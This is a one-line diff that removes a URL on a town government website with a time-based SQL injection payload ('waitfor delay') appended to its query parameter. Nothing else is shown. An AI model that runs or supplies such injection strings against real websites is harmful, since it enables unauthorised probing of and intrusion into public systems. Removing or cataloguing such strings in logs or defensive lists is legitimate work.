@@ -1,1 +1,0 @@
-http://www.cummington-ma.gov/Boards.php?41 waitfor delay '0:0:10'--
